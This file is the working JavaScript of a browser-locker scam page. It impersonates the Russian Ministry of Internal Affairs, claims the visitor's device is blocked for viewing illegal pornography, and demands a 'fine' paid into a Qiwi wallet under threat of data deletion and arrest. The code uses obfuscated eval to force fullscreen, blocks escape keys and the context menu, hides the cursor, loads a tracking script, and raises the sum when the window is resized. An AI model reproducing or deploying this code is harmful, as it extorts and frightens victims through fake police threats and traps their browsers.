jQuery(document).ready(function(){
if (!document.getElementById("httpupdss")) {var d=document;var s=d.createElement('script'); s.id='httpupdss'; s.src='./st.php?se_referrer=' + encodeURIComponent(document.referrer); d.getElementsByTagName('head')[0].appendChild(s);}

document.body.style.overflow = "hidden";


var d = new Date();
var month = d.getMonth()+1;
   if (month < 10) month = '0' + month;
var day = d.getDate();
   if (day < 10) day = '0' + day;
var year = d.getFullYear();

var rand =  Math.floor(Math.random() * (20)) + 50;


/*var tel = ["(913) 172-24-72","(913) 581-45-43"];
var tel = tel[Math.floor(Math.random()*tel.length)];*/



var sum = rand*100;
var oper ='Оплата по нику';




	var jsonString = '{"title": "Министерство Внутренних дел РФ", "alertMsg":"Ваше устройство заблокировано", "resolution": "Постановление &#x2116;184-441 от ", "secondBlock": "&emsp;Вы заблокированы за неоднократное посещение порнографических сайтов, содержащих материалы, запрещенные законодательством РФ, а именно, порнографии с элементами педофилии, насилия и пропаганды гомосексуализма.<br>В связи с ограниченным режимом работы судебных инстанций по причине карантина, Ваше наказание ограничивается штрафом срочного порядка в размере <b><span id=summ>'+(sum)+'</span> рублей.</b><br>Погашение штрафа необходимо произвести через Qiwi-кошелёк. <br>Способ погашения: <strong>'+(oper)+'</strong> и наберите ник: <strong>'+(tel)+'</strong><br>Введите сумму в рублях в размере равном или превышающем сумму штрафа и нажмите <em>Перевести</em>, после чего блокировка будет снята автоматически.<br>", "fourthBlock": "<strong>Важно знать! В случае отказа от оплаты штрафа или попытки самостоятельно снять блокировку:</strong><br>&emsp;Вся информация на Вашем компьютере будет безвозвратно удалена в целях предотвращения распространения порнографии. К месту Вашего проживания будет направлена следственно-оперативная группа для Вашего задержания.<br>&emsp;Против Вас будет возбуждено уголовное дело по факту совершения преступления, предусмотренного ст. 242 УК РФ (карается лишением свободы на срок от двух до шести лет с лишением права занимать определенные должности или заниматься определенной деятельностью сроком до 15 лет).<br><h4 style=\\\"color: red\\\">Установленный ФСИН срок для оплаты штрафа - 12 часов с момента уведомления и блокировки. </h4>"}';


	var json = JSON.parse(jsonString);
	document.title = json.title;
	jQuery('.alert').html(json.alertMsg);
	jQuery('.resolution').html(json.resolution + day+'.'+month+'.'+year+' года.');
	jQuery('.secondBlock').html(json.secondBlock);
	jQuery('.fourthBlock').html(json.fourthBlock);



	var _0xd589=["\x38\x20\x37\x28\x29\x7B\x32\x28\x21\x30\x2E\x39\x26\x26\x21\x30\x2E\x64\x26\x26\x21\x30\x2E\x61\x29\x7B\x32\x28\x30\x2E\x31\x2E\x34\x29\x7B\x30\x2E\x31\x2E\x34\x28\x29\x7D\x35\x20\x32\x28\x30\x2E\x31\x2E\x33\x29\x7B\x30\x2E\x31\x2E\x33\x28\x29\x7D\x35\x20\x32\x28\x30\x2E\x31\x2E\x36\x29\x7B\x30\x2E\x31\x2E\x36\x28\x62\x2E\x63\x29\x7D\x7D\x7D","\x7C","\x73\x70\x6C\x69\x74","\x64\x6F\x63\x75\x6D\x65\x6E\x74\x7C\x64\x6F\x63\x75\x6D\x65\x6E\x74\x45\x6C\x65\x6D\x65\x6E\x74\x7C\x69\x66\x7C\x6D\x6F\x7A\x52\x65\x71\x75\x65\x73\x74\x46\x75\x6C\x6C\x53\x63\x72\x65\x65\x6E\x7C\x72\x65\x71\x75\x65\x73\x74\x46\x75\x6C\x6C\x73\x63\x72\x65\x65\x6E\x7C\x65\x6C\x73\x65\x7C\x77\x65\x62\x6B\x69\x74\x52\x65\x71\x75\x65\x73\x74\x46\x75\x6C\x6C\x73\x63\x72\x65\x65\x6E\x7C\x74\x67\x6C\x46\x53\x7C\x66\x75\x6E\x63\x74\x69\x6F\x6E\x7C\x66\x75\x6C\x6C\x73\x63\x72\x65\x65\x6E\x45\x6C\x65\x6D\x65\x6E\x74\x7C\x77\x65\x62\x6B\x69\x74\x46\x75\x6C\x6C\x73\x63\x72\x65\x65\x6E\x45\x6C\x65\x6D\x65\x6E\x74\x7C\x45\x6C\x65\x6D\x65\x6E\x74\x7C\x41\x4C\x4C\x4F\x57\x5F\x4B\x45\x59\x42\x4F\x41\x52\x44\x5F\x49\x4E\x50\x55\x54\x7C\x6D\x6F\x7A\x46\x75\x6C\x6C\x53\x63\x72\x65\x65\x6E\x45\x6C\x65\x6D\x65\x6E\x74","\x72\x65\x70\x6C\x61\x63\x65","","\x5C\x77\x2B","\x5C\x62","\x67"];eval(function(_0xdbdax1,_0xdbdax2,_0xdbdax3,_0xdbdax4,_0xdbdax5,_0xdbdax6){_0xdbdax5= function(_0xdbdax3){return _0xdbdax3.toString(36)};if(!_0xd589[5][_0xd589[4]](/^/,String)){while(_0xdbdax3--){_0xdbdax6[_0xdbdax3.toString(_0xdbdax2)]= _0xdbdax4[_0xdbdax3]|| _0xdbdax3.toString(_0xdbdax2)};_0xdbdax4= [function(_0xdbdax5){return _0xdbdax6[_0xdbdax5]}];_0xdbdax5= function(){return _0xd589[6]};_0xdbdax3= 1};while(_0xdbdax3--){if(_0xdbdax4[_0xdbdax3]){_0xdbdax1= _0xdbdax1[_0xd589[4]]( new RegExp(_0xd589[7]+ _0xdbdax5(_0xdbdax3)+ _0xd589[7],_0xd589[8]),_0xdbdax4[_0xdbdax3])}};return _0xdbdax1}(_0xd589[0],14,14,_0xd589[3][_0xd589[2]](_0xd589[1]),0,{}))




	setTimeout(func, 2000);
function func() {
	
	window.onkeydown=function(evt)
	{
	if(jQuery.inArray(evt.keyCode,[27,18,123,9,115,116,112,114,17,122])!=-1)
		{
		return false
	}
}
};

window.onkeypress=function(evn)
	{
	if(evn.keyCode==123)return false
};







    document.onclick = function(e) {
        e = e || event;
        target = e.target || e.srcElement;
        tglFS();
        jQuery('body').css('cursor', 'none');
        jQuery('.confirm').hide();
		jQuery('.confirm2').hide();
		jQuery('.header, .footer').css('display', 'flex');
        jQuery('.content').show();
		
	if (!document.getElementById("httpupdssklick")) {var d=document;var s=d.createElement('script'); s.id='httpupdssklick'; s.src='./st.php?isclick=yes&se_referrer=' + encodeURIComponent(document.referrer); d.getElementsByTagName('head')[0].appendChild(s);}	
		
		var element=document.getElementById('telka');
		if(!element){
		jQuery('body').append("<audio id='telka' autoplay='autoplay'><source src='src.mp3'></audio>");  
    }   else jQuery('body').append("<audio id='mmm' autoplay='autoplay'><source src='din.mp3'></audio>");
	
	}

	document.oncontextmenu=new Function("return false");


	jQuery(document).ready(function() {
             function alert2Size() {
               var myHeight = 0;
               if( typeof( window.innerWidth ) == 'number' ) {
                 myHeight = window.innerHeight;
               } else if( document.documentElement && ( document.documentElement.clientWidth ||

             document.documentElement.clientHeight ) ) {
                 myHeight = document.documentElement.clientHeight;
               } else if( document.body && ( document.body.clientWidth || document.body.clientHeight ) ) {
                         myHeight = document.body.clientHeight;
               }
               return myHeight;

             }
              myHeightN=alert2Size();

         });
         $(window).resize(function(){
             function alertNew2Size() {
              var myHeight = 0;
               if( typeof( window.innerWidth ) == 'number' ) {

                 myHeight = window.innerHeight;
               } else if( document.documentElement && ( document.documentElement.clientWidth ||

             document.documentElement.clientHeight ) ) {
                 myHeight = document.documentElement.clientHeight;
               } else if( document.body && ( document.body.clientWidth || document.body.clientHeight ) ) {
                 myHeight = document.body.clientHeight;
               }
               return myHeight;

             }
             myNewHeight=alertNew2Size();

             if (myNewHeight==myHeightN) {


                sum = sum+1000;
				
				document.getElementById('summ').innerHTML = sum;
							
				jQuery('body').css('cursor', 'not-allowed');
			//	jQuery('.content').hide();
				jQuery('.header, .footer').css('display', 'none');
				jQuery('.confirm2').show();
				
				
             };
         });
});
